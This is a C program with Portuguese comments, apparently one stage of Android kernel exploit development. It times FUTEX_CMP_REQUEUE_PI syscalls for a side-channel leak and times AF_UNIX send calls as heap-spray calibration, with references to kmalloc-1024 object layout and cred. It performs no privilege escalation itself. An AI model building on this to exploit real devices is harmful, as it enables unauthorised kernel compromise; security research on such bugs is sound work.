/*
 * ghostlock_leak_cal.c — passo 3 da escada (calibrador timing-only).
 *
 * Mede APENAS tempo de syscall em caminhos ja provados seguros:
 *  - CMP_REQUEUE_PI com cmpval divergente -> EAGAIN (reachability check 3,
 *    7/7 PASS no aparelho). Nenhum par PI, nenhum bloqueio, nenhum reclaim.
 *  - socketpair + SO_SNDBUF + send 8K (timing de spray, sem forjar nada).
 *
 * NAO cria waiter PI, NAO chama WAIT_REQUEUE_PI, NAO faz LOCK_PI cruzado,
 * NAO toca em cred, NAO escreve em kernel. Risco: mesmo de gettimeofday
 * em loop + EAGAIN. Timeout zero, sem threads, sem fds persistentes.
 *
 * Build (NDK r29, ARM64, API 28, mesma receita do reachability):
 *   ~/Android/Sdk/ndk/29.0.14206865/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-clang \
 *     -O2 -Wall -Wextra -fPIE -pie ghostlock_leak_cal.c -o ghostlock_leak_cal
 * Run:
 *   adb push ghostlock_leak_cal /data/local/tmp/ && adb shell /data/local/tmp/ghostlock_leak_cal
 *   adb shell rm /data/local/tmp/ghostlock_leak_cal
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif

#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define NADDR 16
#define NITER 500
#define NROUND 7
#define NSEND 200

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static int cmp64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

int main(void) {
    static uint32_t probe[4096];
    uint32_t anchor = 0;
    uint64_t t[NITER];
    int anomalies = 0;

    /* pin CPU0: tira migracao do ruido, igual aresin faz */
    {
        cpu_set_t m;
        CPU_ZERO(&m);
        CPU_SET(0, &m);
        if (sched_setaffinity(0, sizeof(m), &m))
            printf("[warn] affinity errno=%d (segue sem pin)\n", errno);
    }

    printf("[info] mm_struct=0x338 kmalloc-1024 objs_per_4k=4 (ref build-aq DWARF)\n");

    /* Teste A: best-mediana de NROUND rounds por endereco.
     * Suprime ruido de escalonamento; sinal de hash aparece como
     * endereco consistentemente mais lento. */
    for (int a = 0; a < NADDR; a++) {
        uint32_t *u = &probe[a * 256];
        uint64_t med[NROUND];
        for (int rd = 0; rd < NROUND; rd++) {
            for (int i = 0; i < NITER; i++) {
                uint64_t t0 = now_ns();
                errno = 0;
                long r = xfutex(u, FCRQ, 1, (void *)(uintptr_t)1, &anchor,
                                0xdeadbeef);
                uint64_t t1 = now_ns();
                if (r != -1 || errno != EAGAIN)
                    anomalies++;
                t[i] = t1 - t0;
            }
            qsort(t, NITER, sizeof(t[0]), cmp64);
            med[rd] = t[NITER / 2];
        }
        qsort(med, NROUND, sizeof(med[0]), cmp64);
        printf("[time] addr[%d] best_med=%llu med_of_med=%llu worst_med=%llu ns\n",
               a, (unsigned long long)med[0],
               (unsigned long long)med[NROUND / 2],
               (unsigned long long)med[NROUND - 1]);
    }
    printf("[check] EAGAIN anomalies=%d (want 0)\n", anomalies);

    /* Teste B: timing de spray AF_UNIX 8K, sem forjar objeto algum. */
    {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
            printf("[FAIL] socketpair errno=%d\n", errno);
            return 1;
        }
        int sndbuf = 1024 * 1024;
        setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        static char buf[8192];
        memset(buf, 0x41, sizeof(buf));
        uint64_t s2[NSEND];
        int wfail = 0;
        for (int i = 0; i < NSEND; i++) {
            uint64_t t0 = now_ns();
            ssize_t w = send(sv[0], buf, sizeof(buf), MSG_DONTWAIT);
            uint64_t t1 = now_ns();
            if (w != (ssize_t)sizeof(buf)) {
                /* buffer cheio: esvazia e continua, sem falhar */
                char dr[8192];
                while (recv(sv[1], dr, sizeof(dr), MSG_DONTWAIT) > 0)
                    ;
                wfail++;
            }
            s2[i] = t1 - t0;
        }
        qsort(s2, NSEND, sizeof(s2[0]), cmp64);
        printf("[spray] send8k min=%llu med=%llu max=%llu ns full_drains=%d\n",
               (unsigned long long)s2[0],
               (unsigned long long)s2[NSEND / 2],
               (unsigned long long)s2[NSEND - 1], wfail);
        close(sv[0]);
        close(sv[1]);
    }

    printf("[summary] anomalies=%d\n", anomalies);
    return anomalies ? 1 : 0;
}
